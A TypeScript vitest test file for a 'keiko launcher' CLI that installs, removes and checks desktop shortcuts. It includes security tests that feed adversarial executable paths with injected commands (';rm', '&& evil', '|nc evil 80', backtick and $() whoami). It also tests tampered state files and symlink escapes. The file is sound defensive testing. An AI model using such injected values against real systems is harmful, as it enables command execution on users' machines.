import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir, platform as osPlatform } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { runLauncherCli, type LauncherCliDeps } from "./launcher.js";
import type { CliIo } from "./runner.js";
import { hashContent, loadState } from "./launcher-state.js";

interface Captured {
  readonly io: CliIo;
  readonly out: () => string;
  readonly err: () => string;
}

function makeIo(): Captured {
  const outChunks: string[] = [];
  const errChunks: string[] = [];
  return {
    io: {
      out: (text: string): void => {
        outChunks.push(text);
      },
      err: (text: string): void => {
        errChunks.push(text);
      },
    },
    out: (): string => outChunks.join(""),
    err: (): string => errChunks.join(""),
  };
}

const tempRoots: string[] = [];

function makeRoot(): string {
  const root = mkdtempSync(join(tmpdir(), "keiko-launcher-"));
  tempRoots.push(root);
  return root;
}

afterEach(() => {
  for (const root of tempRoots.splice(0)) {
    rmSync(root, { recursive: true, force: true });
  }
});

// Build a deps object whose homedir is a temp root and whose exec path is a known-safe
// allow-listed fixture (no spaces, no metacharacters). The state dir is set explicitly so
// every test runs against a fresh `.keiko/`.
interface Harness {
  readonly deps: LauncherCliDeps;
  readonly home: string;
  readonly stateDir: string;
  readonly exe: string;
  readonly approvedDir: string;
  readonly targetPath: string;
}

function makeHarness(platform: NodeJS.Platform = "linux", exe = "/usr/local/bin/keiko"): Harness {
  const root = makeRoot();
  const home = join(root, "home");
  const stateDir = join(root, "state");
  mkdirSync(home, { recursive: true });
  mkdirSync(stateDir, { recursive: true });
  // Per-platform expected install dir (computed exactly as the platform module would).
  const approvedDir =
    platform === "linux"
      ? join(home, ".local/share/applications")
      : platform === "darwin"
        ? join(home, "Applications")
        : join(home, "AppData/Roaming/Microsoft/Windows/Start Menu/Programs");
  const fileName =
    platform === "linux"
      ? "keiko.desktop"
      : platform === "darwin"
        ? "Keiko Launcher.command"
        : "Keiko.bat";
  return {
    home,
    stateDir,
    exe,
    approvedDir,
    targetPath: join(approvedDir, fileName),
    deps: {
      homedir: () => home,
      platform: () => platform,
      resolveExe: () => exe,
      stateDir,
    },
  };
}

describe("runLauncherCli — help and unknown subcommand", () => {
  it("prints USAGE and returns 0 on no args", () => {
    const c = makeIo();
    expect(runLauncherCli([], c.io, {})).toBe(0);
    expect(c.out()).toContain("Usage:");
    expect(c.out()).toContain("keiko launcher install");
  });

  it("prints USAGE and returns 0 on --help", () => {
    const c = makeIo();
    expect(runLauncherCli(["--help"], c.io, {})).toBe(0);
    expect(c.out()).toContain("keiko launcher install");
  });

  it("returns 2 with USAGE on unknown subcommand", () => {
    const c = makeIo();
    expect(runLauncherCli(["foo"], c.io, {})).toBe(2);
    expect(c.err()).toContain("unknown subcommand");
  });

  it("returns 2 on unknown install flag", () => {
    const h = makeHarness();
    const c = makeIo();
    expect(runLauncherCli(["install", "--whatever"], c.io, {}, h.deps)).toBe(2);
    expect(c.err()).toContain("unknown flag");
  });
});

describe("runLauncherCli install — happy paths", () => {
  it("install --dry-run writes nothing but reports the plan", () => {
    const h = makeHarness();
    const c = makeIo();
    expect(runLauncherCli(["install", "--dry-run"], c.io, {}, h.deps)).toBe(0);
    expect(c.out()).toContain(h.targetPath);
    expect(c.out()).toContain("dry run");
    expect(existsSync(h.targetPath)).toBe(false);
  });

  it("install --explain writes nothing but shows full content + removal command", () => {
    const h = makeHarness();
    const c = makeIo();
    expect(runLauncherCli(["install", "--explain"], c.io, {}, h.deps)).toBe(0);
    expect(c.out()).toContain("--- begin generated content ---");
    expect(c.out()).toContain("Exec=/usr/local/bin/keiko start --open");
    expect(c.out()).toContain("Remove with: keiko launcher remove");
    expect(existsSync(h.targetPath)).toBe(false);
  });

  it("install writes the linux .desktop file at the expected path with correct content", () => {
    const h = makeHarness();
    const c = makeIo();
    expect(runLauncherCli(["install"], c.io, {}, h.deps)).toBe(0);
    expect(existsSync(h.targetPath)).toBe(true);
    const content = readFileSync(h.targetPath, "utf8");
    expect(content).toContain("[Desktop Entry]");
    expect(content).toContain("Exec=/usr/local/bin/keiko start --open\n");
    const state = loadState(h.stateDir);
    expect(state.entries).toHaveLength(1);
    const first = state.entries[0];
    expect(first?.path).toBe(h.targetPath);
    expect(first?.contentSha256).toBe(hashContent(content));
  });

  it("install accepts a scoped npm path containing @ in the executable location", () => {
    const scopedExe = "/workspace/node_modules/@oscharko-dev/keiko/bin/keiko";
    const h = makeHarness("linux", scopedExe);
    const c = makeIo();
    expect(runLauncherCli(["install"], c.io, {}, h.deps)).toBe(0);
    const content = readFileSync(h.targetPath, "utf8");
    expect(content).toContain(`Exec=${scopedExe} start --open\n`);
  });

  it("install --port 3000 bakes the port into the Exec line", () => {
    const h = makeHarness();
    const c = makeIo();
    expect(runLauncherCli(["install", "--port", "3000"], c.io, {}, h.deps)).toBe(0);
    const content = readFileSync(h.targetPath, "utf8");
    expect(content).toContain("Exec=/usr/local/bin/keiko start --open --port 3000");
  });

  it("install is idempotent — a second run with identical content does not error", () => {
    const h = makeHarness();
    const c1 = makeIo();
    expect(runLauncherCli(["install"], c1.io, {}, h.deps)).toBe(0);
    const c2 = makeIo();
    expect(runLauncherCli(["install"], c2.io, {}, h.deps)).toBe(0);
    expect(c2.out()).toContain("idempotent");
    const state = loadState(h.stateDir);
    expect(state.entries).toHaveLength(1);
  });

  it("install writes a macOS .command with 0o755 mode and exec line", () => {
    if (osPlatform() === "win32") return;
    const h = makeHarness("darwin");
    const c = makeIo();
    expect(runLauncherCli(["install"], c.io, {}, h.deps)).toBe(0);
    const content = readFileSync(h.targetPath, "utf8");
    expect(content.startsWith("#!/usr/bin/env bash")).toBe(true);
    expect(content).toContain("exec /usr/local/bin/keiko start --open");
    const mode = statSync(h.targetPath).mode & 0o777;
    expect(mode).toBe(0o755);
  });

  it("install writes a windows .bat with CRLF and @start", () => {
    // Only run when actually on Windows: simulating win32 on a Posix host would have the
    // launcher attempt to mkdir a path with backslash separators, which the host POSIX
    // mkdir cannot create. The content shape is already golden-tested in
    // launcher-platforms.test.ts; this test verifies end-to-end FS write on Windows.
    if (osPlatform() !== "win32") return;
    const h = makeHarness("win32", "C:\\Tools\\keiko.exe");
    const c = makeIo();
    expect(runLauncherCli(["install"], c.io, {}, h.deps)).toBe(0);
    const content = readFileSync(h.targetPath, "utf8");
    expect(content).toBe('@start "" C:\\Tools\\keiko.exe start --open\r\n');
  });
});

describe("runLauncherCli install — refusals (security)", () => {
  it("refuses --port below 1024", () => {
    const h = makeHarness();
    const c = makeIo();
    expect(runLauncherCli(["install", "--port", "80"], c.io, {}, h.deps)).toBe(2);
    expect(c.err().toLowerCase()).toContain("port");
  });
  it("refuses --port above 65535", () => {
    const h = makeHarness();
    const c = makeIo();
    expect(runLauncherCli(["install", "--port", "70000"], c.io, {}, h.deps)).toBe(2);
  });
  it("refuses --port non-integer", () => {
    const h = makeHarness();
    const c = makeIo();
    expect(runLauncherCli(["install", "--port", "abc"], c.io, {}, h.deps)).toBe(2);
  });
  it("refuses --port missing value", () => {
    const h = makeHarness();
    const c = makeIo();
    expect(runLauncherCli(["install", "--port"], c.io, {}, h.deps)).toBe(2);
  });

  // Adversarial exec paths — the launcher MUST refuse each individually with exit 1.
  const ADVERSARIAL: readonly (readonly [string, string])[] = [
    ["/usr/local/bin/keiko;rm", "semicolon"],
    ["/usr/local/bin/keiko && evil", "&& chain"],
    ["/Users/me/My Keiko/bin/keiko", "space"],
    ["/usr/local/bin/keiko|nc evil 80", "pipe"],
    ["/usr/local/bin/keiko`whoami`", "backticks"],
    ["/usr/local/bin/keiko$(whoami)", "$() substitution"],
    ["~/bin/keiko", "tilde"],
  ];
  for (const [bad, label] of ADVERSARIAL) {
    it(`refuses install when exec path is adversarial (${label}): ${JSON.stringify(bad)}`, () => {
      const h = makeHarness("linux", bad);
      const c = makeIo();
      expect(runLauncherCli(["install"], c.io, {}, h.deps)).toBe(1);
      expect(c.err()).toMatch(/disallowed characters|cannot locate/i);
      expect(existsSync(h.targetPath)).toBe(false);
    });
  }

  it("refuses to overwrite a foreign file at the target path", () => {
    const h = makeHarness();
    mkdirSync(h.approvedDir, { recursive: true });
    writeFileSync(h.targetPath, "DEFINITELY NOT KEIKO\n");
    const c = makeIo();
    expect(runLauncherCli(["install"], c.io, {}, h.deps)).toBe(1);
    expect(c.err()).toContain("refusing to overwrite");
    // Foreign content untouched.
    expect(readFileSync(h.targetPath, "utf8")).toBe("DEFINITELY NOT KEIKO\n");
  });

  it("refuses to write through a symlink at the target path", () => {
    if (osPlatform() === "win32") return;
    const h = makeHarness();
    mkdirSync(h.approvedDir, { recursive: true });
    const realFile = join(makeRoot(), "evil");
    writeFileSync(realFile, "evil");
    symlinkSync(realFile, h.targetPath);
    expect(lstatSync(h.targetPath).isSymbolicLink()).toBe(true);
    const c = makeIo();
    expect(runLauncherCli(["install"], c.io, {}, h.deps)).toBe(1);
    // Either the containment check (realpath now follows the symlink and escapes the
    // approved dir) or the explicit symlink refusal MUST refuse — we accept either.
    expect(c.err()).toMatch(/symlink|refusing to write outside/);
    // The symlink target was not overwritten.
    expect(readFileSync(realFile, "utf8")).toBe("evil");
  });

  it("refuses when the approved dir itself is a symlink", () => {
    if (osPlatform() === "win32") return;
    const h = makeHarness();
    // Make ~/.local/share/applications a symlink to a non-approved directory.
    mkdirSync(join(h.home, ".local/share"), { recursive: true });
    const evilDir = join(makeRoot(), "evil-dir");
    mkdirSync(evilDir, { recursive: true });
    symlinkSync(evilDir, h.approvedDir);
    const c = makeIo();
    expect(runLauncherCli(["install"], c.io, {}, h.deps)).toBe(1);
    // Containment realpath catches this (approved dir resolves to evil-dir; target is
    // textually under the symlink path, which lives at the home temp root, so containment
    // fails OR the explicit symlink-refusal fires — either is correct.
    expect(c.err()).toMatch(/symlink|refusing to write outside/);
  });
});

describe("runLauncherCli remove", () => {
  it("returns 0 + 'nothing to remove' when state is empty", () => {
    const h = makeHarness();
    const c = makeIo();
    expect(runLauncherCli(["remove"], c.io, {}, h.deps)).toBe(0);
    expect(c.out()).toContain("nothing to remove");
  });

  it("deletes a recorded shortcut and clears its state entry", () => {
    const h = makeHarness();
    runLauncherCli(["install"], makeIo().io, {}, h.deps);
    expect(existsSync(h.targetPath)).toBe(true);
    const c = makeIo();
    expect(runLauncherCli(["remove"], c.io, {}, h.deps)).toBe(0);
    expect(existsSync(h.targetPath)).toBe(false);
    expect(loadState(h.stateDir).entries).toEqual([]);
  });

  it("--dry-run lists what would be deleted but deletes nothing", () => {
    const h = makeHarness();
    runLauncherCli(["install"], makeIo().io, {}, h.deps);
    const c = makeIo();
    expect(runLauncherCli(["remove", "--dry-run"], c.io, {}, h.deps)).toBe(0);
    expect(c.out()).toContain("would-delete");
    expect(existsSync(h.targetPath)).toBe(true);
    expect(loadState(h.stateDir).entries).toHaveLength(1);
  });

  it("refuses to delete a tampered (foreign) file at a recorded path", () => {
    const h = makeHarness();
    runLauncherCli(["install"], makeIo().io, {}, h.deps);
    // Tamper: overwrite the file but keep state hash from the original.
    chmodSync(h.targetPath, 0o644);
    writeFileSync(h.targetPath, "FOREIGN CONTENT");
    const c = makeIo();
    expect(runLauncherCli(["remove"], c.io, {}, h.deps)).toBe(1);
    expect(c.err()).toContain("refusing");
    // Foreign content untouched; state entry retained.
    expect(readFileSync(h.targetPath, "utf8")).toBe("FOREIGN CONTENT");
    expect(loadState(h.stateDir).entries).toHaveLength(1);
  });

  it("clears state for a recorded path that is already missing", () => {
    const h = makeHarness();
    runLauncherCli(["install"], makeIo().io, {}, h.deps);
    rmSync(h.targetPath);
    const c = makeIo();
    expect(runLauncherCli(["remove"], c.io, {}, h.deps)).toBe(0);
    expect(c.out()).toContain("missing");
    expect(loadState(h.stateDir).entries).toEqual([]);
  });
});

// Helper for the parse-time-containment regression tests (F1/F2): plants a state file
// with attacker-chosen `entry.path` AFTER computing the correct content-hash, so the
// only thing protecting the user is the containment check (not the hash check).
function plantTamperedStateFile(
  stateDir: string,
  platform: NodeJS.Platform,
  targetPath: string,
  targetContent: string,
): void {
  mkdirSync(stateDir, { recursive: true });
  const entry = {
    path: targetPath,
    platform,
    contentSha256: hashContent(targetContent),
    createdAt: "2026-06-05T00:00:00.000Z",
  };
  writeFileSync(
    join(stateDir, "launcher-state.json"),
    JSON.stringify({ version: 1, entries: [entry] }) + "\n",
  );
}

describe("runLauncherCli — state-file tamper regression (F1/F2)", () => {
  it("F1 — remove REFUSES to unlink an out-of-bounds path planted in the state file", () => {
    if (osPlatform() === "win32") return;
    const h = makeHarness();
    // Sensitive target lives OUTSIDE the approved installDir; create it via mkdtempSync
    // so the test never touches a real ~/.ssh path.
    const sensitiveRoot = makeRoot();
    const sensitive = join(sensitiveRoot, "authorized_keys");
    const sensitiveContent = "ssh-rsa AAAA real-user-key\n";
    writeFileSync(sensitive, sensitiveContent);
    // Plant tampered state with a CORRECT content hash so only containment can save us.
    plantTamperedStateFile(h.stateDir, "linux", sensitive, sensitiveContent);
    const c = makeIo();
    const code = runLauncherCli(["remove"], c.io, {}, h.deps);
    // Tampered entry is silently dropped at parse-time → loadState yields no entries →
    // `cmdRemove` reports "nothing to remove" and exits 0. The KEY assertion is that the
    // sensitive file is STILL THERE — `unlinkSync` was never reached.
    expect(existsSync(sensitive)).toBe(true);
    expect(readFileSync(sensitive, "utf8")).toBe(sensitiveContent);
    expect(c.err()).toContain("refusing tampered state entry");
    expect(code).toBe(0);
  });

  it("F2 — status REFUSES to existsSync/readFileSync an out-of-bounds planted entry", () => {
    if (osPlatform() === "win32") return;
    const h = makeHarness();
    const sensitiveRoot = makeRoot();
    const sensitive = join(sensitiveRoot, "private.txt");
    writeFileSync(sensitive, "secret\n");
    plantTamperedStateFile(h.stateDir, "linux", sensitive, "secret\n");
    const c = makeIo();
    const code = runLauncherCli(["status"], c.io, {}, h.deps);
    // Entry filtered out at parse time → status reports "no shortcuts recorded" and the
    // sensitive file's path/content/existence is never enumerated on stdout.
    expect(c.out()).toContain("no shortcuts recorded");
    expect(c.out()).not.toContain(sensitive);
    expect(c.err()).toContain("refusing tampered state entry");
    expect(code).toBe(0);
    expect(readFileSync(sensitive, "utf8")).toBe("secret\n");
  });

  it("F2 — status reports 'unreadable' instead of leaking a read error stack", () => {
    if (osPlatform() === "win32") return;
    const h = makeHarness();
    // Install a real shortcut first, then replace the file with a directory (EISDIR on
    // readFileSync) — forces cmdStatus to take the new catch path.
    runLauncherCli(["install"], makeIo().io, {}, h.deps);
    rmSync(h.targetPath);
    mkdirSync(h.targetPath);
    const c = makeIo();
    expect(runLauncherCli(["status"], c.io, {}, h.deps)).toBe(0);
    expect(c.out()).toContain(`${h.targetPath}\tunreadable`);
    expect(c.err()).toBe("");
  });
});

describe("runLauncherCli — KEIKO_STATE_DIR containment (F4)", () => {
  it("refuses with STATE_DIR_ESCAPE when KEIKO_STATE_DIR resolves outside homedir", () => {
    if (osPlatform() === "win32") return;
    const root = makeRoot();
    const home = join(root, "home");
    mkdirSync(home, { recursive: true });
    // Escape target lives OUTSIDE home (sibling under the test temp root).
    const escapeRoot = makeRoot();
    const escapeDir = join(escapeRoot, "evil-state");
    mkdirSync(escapeDir, { recursive: true });
    const c = makeIo();
    // Pass KEIKO_STATE_DIR via the `env` arg (the launcher reads from EnvSource OR
    // process.env; EnvSource takes precedence). Do NOT pass deps.stateDir — that would
    // bypass the defaultStateDir path we're testing.
    const code = runLauncherCli(
      ["status"],
      c.io,
      { KEIKO_STATE_DIR: escapeDir },
      { homedir: () => home, platform: () => "linux", resolveExe: () => "/usr/local/bin/keiko" },
    );
    expect(code).toBe(1);
    expect(c.err()).toContain("KEIKO_STATE_DIR");
    expect(c.err()).toContain("outside the user's home directory");
  });

  it("accepts KEIKO_STATE_DIR when contained under homedir", () => {
    if (osPlatform() === "win32") return;
    const root = makeRoot();
    const home = join(root, "home");
    const stateDir = join(home, "custom-state");
    mkdirSync(stateDir, { recursive: true });
    const c = makeIo();
    const code = runLauncherCli(
      ["status"],
      c.io,
      { KEIKO_STATE_DIR: stateDir },
      { homedir: () => home, platform: () => "linux", resolveExe: () => "/usr/local/bin/keiko" },
    );
    expect(code).toBe(0);
    expect(c.out()).toContain("no shortcuts recorded");
  });
});

describe("runLauncherCli status", () => {
  it("returns 0 with a clean message when no shortcuts recorded", () => {
    const h = makeHarness();
    const c = makeIo();
    expect(runLauncherCli(["status"], c.io, {}, h.deps)).toBe(0);
    expect(c.out()).toContain("no shortcuts recorded");
  });

  it("reports ok for an unmodified shortcut", () => {
    const h = makeHarness();
    runLauncherCli(["install"], makeIo().io, {}, h.deps);
    const c = makeIo();
    expect(runLauncherCli(["status"], c.io, {}, h.deps)).toBe(0);
    expect(c.out()).toContain(`${h.targetPath}\tok`);
  });

  it("reports modified for a tampered shortcut", () => {
    const h = makeHarness();
    runLauncherCli(["install"], makeIo().io, {}, h.deps);
    chmodSync(h.targetPath, 0o644);
    writeFileSync(h.targetPath, "TAMPERED");
    const c = makeIo();
    expect(runLauncherCli(["status"], c.io, {}, h.deps)).toBe(0);
    expect(c.out()).toContain("modified");
  });

  it("reports missing for a deleted shortcut", () => {
    const h = makeHarness();
    runLauncherCli(["install"], makeIo().io, {}, h.deps);
    rmSync(h.targetPath);
    const c = makeIo();
    expect(runLauncherCli(["status"], c.io, {}, h.deps)).toBe(0);
    expect(c.out()).toContain("missing");
  });
});
